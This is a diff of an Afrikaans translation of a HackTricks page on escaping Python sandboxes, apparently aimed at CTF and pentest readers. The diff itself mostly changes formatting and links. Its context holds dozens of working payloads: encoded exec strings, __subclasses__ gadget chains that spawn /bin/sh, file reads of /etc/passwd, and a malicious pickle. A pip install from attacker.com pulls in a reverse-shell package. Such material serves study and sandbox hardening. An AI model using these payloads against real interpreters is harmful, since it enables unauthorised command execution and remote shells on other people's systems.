@@ -16,7 +16,7 @@ Ander maniere om HackTricks te ondersteun:
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -27,6 +27,7 @@ Hierdie is 'n paar truuks om Python sandboksbeskermings te omseil en arbitrêre 
 ## Beveluitvoeringsbiblioteke
 
 Die eerste ding wat jy moet weet, is of jy direk kode kan uitvoer met 'n reeds ingevoerde biblioteek, of as jy enige van hierdie biblioteke kan invoer:
+
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -59,6 +60,7 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
+
 Onthou dat die _**open**_ en _**read**_ funksies nuttig kan wees om lêers binne die Python sandboks te lees en om kode te skryf wat jy kan uitvoer om die sandboks te omseil.
 
 {% hint style="danger" %}
@@ -76,6 +78,7 @@ Python probeer om biblioteke **van die huidige gids eerste te laai** (die volgen
 Jy kan 'n **lys van vooraf geïnstalleerde** pakkette hier vind: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
 Let daarop dat jy vanuit 'n pickle die Python-omgewing **willekeurige biblioteke kan invoer** wat op die stelsel geïnstalleer is.\
 Byvoorbeeld, die volgende pickle, wanneer dit gelaai word, gaan die pip-bibliotheek invoer om dit te gebruik:
+
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -88,6 +91,7 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
+
 Vir meer inligting oor hoe pickle werk, kyk hier: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
 ### Pip-pakket
@@ -95,10 +99,12 @@ Vir meer inligting oor hoe pickle werk, kyk hier: [https://checkoway.net/musings
 Truuk gedeel deur **@isHaacK**
 
 As jy toegang het tot `pip` of `pip.main()`, kan jy 'n willekeurige pakket installeer en 'n omgekeerde skaal verkry deur te roep:
+
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
+
 Jy kan die pakket aflaai om die omgekeerde dop hier te skep. Let asseblief daarop dat voordat jy dit gebruik, moet jy **dit dekomprimeer, die `setup.py` verander, en jou IP vir die omgekeerde dop plaas**:
 
 {% file src="../../../.gitbook/assets/reverse.tar.gz" %}
@@ -114,6 +120,7 @@ Let daarop dat exec meerdere lynstrings en ";", maar eval nie toelaat nie (kontr
 {% endhint %}
 
 As sekere karakters verbode is, kan jy die **hex/oktaal/B64**-voorstelling gebruik om die beperking te **omseil**:
+
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -134,7 +141,9 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
+
 ### Ander biblioteke wat dit moontlik maak om Python-kode te evalueer
+
 ```python
 #Pandas
 import pandas as pd
@@ -148,7 +157,9 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 # Like:
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
+
 ## Operateurs en kort truuks
+
 ```python
 # walrus operator allows generating variable inside a list
 ## everything will be executed in order
@@ -157,9 +168,11 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
+
 ## Bypassing beskerming deur kodering (UTF-7)
 
 In [**hierdie skryfstuk**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) word UTF-7 gebruik om arbitrêre Python-kode te laai en uit te voer binne 'n skynbare sandput:
+
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -170,6 +183,7 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
+
 Dit is ook moontlik om dit te omseil deur ander enkoderings te gebruik, bv. `raw_unicode_escape` en `unicode_escape`.
 
 ## Python-uitvoering sonder oproepe
@@ -177,6 +191,7 @@ Dit is ook moontlik om dit te omseil deur ander enkoderings te gebruik, bv. `raw
 As jy binne 'n Python-gevangenis is wat jou nie toelaat om oproepe te maak nie, is daar steeds maniere om arbitrêre funksies, kode en opdragte uit te voer.
 
 ### RCE met [decorators](https://docs.python.org/3/glossary.html#term-decorator)
+
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 @exec
@@ -198,6 +213,7 @@ X = exec(X)
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
+
 ### RCE skep voorwerpe en oorlading
 
 As jy **'n klas kan verklaar** en **'n voorwerp van daardie klas kan skep**, kan jy **verskillende metodes skryf/herskryf** wat **geaktiveer kan word** **sonder** om hulle **direk te roep**.
@@ -205,6 +221,7 @@ As jy **'n klas kan verklaar** en **'n voorwerp van daardie klas kan skep**, kan
 #### RCE met aangepaste klasse
 
 Jy kan sommige **klasmetodes** wysig (_deur bestaande klasmetodes te oorskryf of 'n nuwe klas te skep_) om hulle **willekeurige kode uit te voer** wanneer hulle **geaktiveer** word sonder om hulle direk te roep.
+
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -254,9 +271,11 @@ __iand__ (k = 'import os; os.system("sh")')
 __ior__ (k |= 'import os; os.system("sh")')
 __ixor__ (k ^= 'import os; os.system("sh")')
 ```
+
 #### Skep voorwerpe met [metaklasse](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
 Die sleutelding wat metaklasse ons toelaat om te doen is **'n instansie van 'n klas te maak, sonder om die konstrukteur direk te roep**, deur 'n nuwe klas met die teiken klas as 'n metaklas te skep.
+
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -271,9 +290,11 @@ Sub['import os; os.system("sh")']
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
+
 #### Skep van voorwerpe met uitsonderings
 
 Wanneer 'n **uitsondering geaktiveer** word, word 'n voorwerp van die **Uitsondering** **geskep** sonder dat jy die konstrukteur direk hoef te roep ( 'n truuk van [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
+
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -293,7 +314,9 @@ k + 'import os; os.system("sh")' #RCE abusing __add__
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
+
 ### Meer RCE
+
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 # If sys is imported, you can sys.excepthook and trigger it by triggering an error
@@ -315,7 +338,9 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
+
 ### Lees lêer met behulp van ingeboude help & lisensie
+
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -324,16 +349,19 @@ a.__class__.__exit__ = lambda self, *args: None
 with (a as b):
 pass
 ```
+
 ## Ingeboude funksies
 
 * [**Ingeboude funksies van python2**](https://docs.python.org/2/library/functions.html)
 * [**Ingeboude funksies van python3**](https://docs.python.org/3/library/functions.html)
 
 As jy toegang het tot die **`__builtins__`** objek, kan jy biblioteke invoer (let daarop dat jy ook ander string voorstellings hier kan gebruik wat in die laaste afdeling gewys word):
+
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
+
 ### Geen Ingeboude Functies
 
 Wanneer jy nie `__builtins__` het nie, sal jy nie in staat wees om enigiets in te voer nie, of selfs lêers te lees of te skryf nie, aangesien **alle globale funksies** (soos `open`, `import`, `print`...) **nie gelaai is nie**.\
@@ -342,6 +370,7 @@ Nietemin, **standaard invoer Python baie modules in die geheue**. Hierdie module
 In die volgende voorbeelde kan jy sien hoe om van hierdie "**onskuldige**" modules wat gelaai is, te **misbruik** om toegang te kry tot **gevaarlike** **funksionaliteite** binne-in hulle.
 
 **Python2**
+
 ```python
 #Try to reload __builtins__
 reload(__builtins__)
@@ -362,9 +391,11 @@ import __builtin__
 # Or you could obtain the builtins from a defined function
 get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
+
 #### Python3
 
 #### Afrikaans Translation
+
 ```python
 # Obtain builtins from a globally defined function
 # https://docs.python.org/3/library/functions.html
@@ -383,15 +414,19 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
+
 [**Hieronder is 'n groter funksie**](./#recursive-search-of-builtins-globals) om tientalle/**honderde** **plekke** te vind waar jy die **builtins** kan vind.
 
 #### Python2 en Python3
+
 ```python
 # Recover __builtins__ and make everything easier
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
+
 ### Ingeboude ladingstukke
+
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -399,9 +434,11 @@ __builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
+
 ## Globals en locals
 
 Die **`globals`** en **`locals`** nagaan is 'n goeie manier om te weet wat jy kan bereik.
+
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -425,6 +462,7 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
+
 [**Hieronder is 'n groter funksie**](./#recursive-search-of-builtins-globals) om tientalle/**honderde** van **plekke** te vind waar jy die **globals** kan vind.
 
 ## Ontdek Willekeurige Uitvoering
@@ -434,6 +472,7 @@ Hier wil ek verduidelik hoe om maklik **meer gevaarlike funksionaliteite wat gel
 #### Toegang tot subklasse met omseilings
 
 Een van die mees sensitiewe dele van hierdie tegniek is om die basis subklasse te kan **bereik**. In die vorige voorbeelde is dit gedoen deur `''.__class__.__base__.__subclasses__()` te gebruik, maar daar is **ander moontlike maniere**:
+
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -461,18 +500,24 @@ defined_func.__class__.__base__.__subclasses__()
 (''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
 (''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
+
 ### Vind gevaarlike biblioteke wat gelaai is
 
 Byvoorbeeld, deur te weet dat dit met die biblioteek **`sys`** moontlik is om **arbitrêre biblioteke in te voer**, kan jy soek na al die **modules wat gelaai is en wat sys binne hulle geïmporteer het**:
+
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
+
 Daar is baie, en **ons het net een nodig** om bevele uit te voer:
+
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
+
 Ons kan dieselfde ding doen met **ander biblioteke** wat ons weet kan gebruik word om **opdragte uit te voer**:
+
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -507,9 +552,11 @@ Ons kan dieselfde ding doen met **ander biblioteke** wat ons weet kan gebruik wo
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
+
 ### Afrikaans Translation:
 
 ### Boonop, ons kan selfs soek watter modules skadelike biblioteke laai:
+
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
@@ -528,7 +575,9 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
+
 Verder, as jy dink **ander biblioteke** moontlik in staat kan wees om **funksies aan te roep om bevele uit te voer**, kan ons ook **filter op funksienames** binne die moontlike biblioteke:
+
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -560,11 +609,13 @@ execfile:
 execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
 ```
+
 ## Deursigtige Soektog van Ingeboude Funksies, Globals...
 
 {% hint style="warning" %}
 Dit is net **fantasties**. As jy **op soek is na 'n objek soos globals, builtins, open of enigiets** gebruik net hierdie skrip om **deursigtig plekke te vind waar jy daardie objek kan vind.**
 {% endhint %}
+
 ```python
 import os, sys # Import these to find more gadgets
 
@@ -680,10 +731,11 @@ print(SEARCH_FOR)
 if __name__ == "__main__":
 main()
 ```
+
 Jy kan die uitset van hierdie skripsie op hierdie bladsy nagaan:
 
-{% content-ref url="broken-reference/" %}
-[broken-reference](broken-reference/)
+{% content-ref url="https://github.com/carlospolop/hacktricks/blob/af/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md" %}
+[https://github.com/carlospolop/hacktricks/blob/af/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md](https://github.com/carlospolop/hacktricks/blob/af/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md)
 {% endcontent-ref %}
 
 ## Python Formaatstring
@@ -694,6 +746,7 @@ As jy 'n string na Python **stuur** wat **geformateer** gaan word, kan jy `{}` g
 Daar is egter 'n **beperking**, jy kan net die simbole `.[]` gebruik, sodat jy nie **willekeurige kode kan uitvoer nie**, net om inligting te lees.\
 _**As jy weet hoe om kode deur hierdie kwesbaarheid uit te voer, kontak my asseblief.**_
 {% endhint %}
+
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -713,16 +766,20 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
+
 Let daarop hoe jy **eienskappe kan bereik** op 'n normale manier met 'n **punt** soos `people_obj.__init__` en **woordeboek element** met **haakies** sonder aanhalingstekens `__globals__[CONFIG]`
 
 Let ook daarop dat jy `.__dict__` kan gebruik om elemente van 'n objek op te som `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
 Sommige ander interessante eienskappe van formaatreekse is die moontlikheid om die **funksies** **`str`**, **`repr`** en **`ascii`** uit te voer in die aangeduide objek deur **`!s`**, **`!r`**, **`!a`** onderskeidelik by te voeg:
+
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
+
 Daarbenewens is dit moontlik om **nuwe formatters te kodeer** in klasse:
+
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -733,6 +790,7 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
+
 **Meer voorbeelde** oor **formaat** **string** voorbeelde kan gevind word op [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
@@ -744,6 +802,7 @@ Kyk ook na die volgende bladsy vir toestelle wat **gevoelige inligting van Pytho
 {% endcontent-ref %}
 
 ### Gevoelige Inligting Openbaarmakingsladingen
+
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -754,6 +813,7 @@ Kyk ook na die volgende bladsy vir toestelle wat **gevoelige inligting van Pytho
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
 ```
+
 ## Ontleed Python-voorwerpe
 
 {% hint style="info" %}
@@ -763,6 +823,7 @@ As jy meer wil leer oor **python bytekode** in diepte, lees hierdie **fantasties
 In sommige CTF's kan jy voorsien word met die naam van 'n **aangepaste funksie waar die vlag** geleë is en jy moet die **interne werking** van die **funksie** sien om dit te onttrek.
 
 Dit is die funksie om te ondersoek:
+
 ```python
 def get_flag(some_input):
 var1=1
@@ -773,16 +834,20 @@ return "THIS-IS-THE-FALG!"
 else:
 return "Nope"
 ```
+
 #### dir
+
 ```python
 dir() #General dir() to find what we have loaded
 ['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
 dir(get_flag) #Get info tof the function
 ['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
 ```
+
 #### globals
 
 `__globals__` en `func_globals`(Dieselfde) Kry die globale omgewing. In die voorbeeld kan jy sien dat sommige ingevoerde modules, sommige globale veranderlikes en hul inhoud verklaar is:
+
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -791,11 +856,13 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
+
 [**Sien hier meer plekke om globale waardes te verkry**](./#globals-and-locals)
 
 ### **Toegang tot die funksie kode**
 
 **`__code__`** en `func_code`: Jy kan hierdie **eienskap** van die funksie **toegang** om die kode objek van die funksie te **verkry**.
+
 ```python
 # In our current example
 get_flag.__code__
@@ -809,7 +876,9 @@ compile("print(5)", "", "single")
 dir(get_flag.__code__)
 ['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
 ```
+
 ### Kry Kode-inligting
+
 ```python
 # Another example
 s = '''
@@ -855,7 +924,9 @@ get_flag.__code__.co_freevars
 get_flag.__code__.co_code
 'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
 ```
+
 ### **Ontassembling 'n funksie**
+
 ```python
 import dis
 dis.dis(get_flag)
@@ -883,7 +954,9 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
+
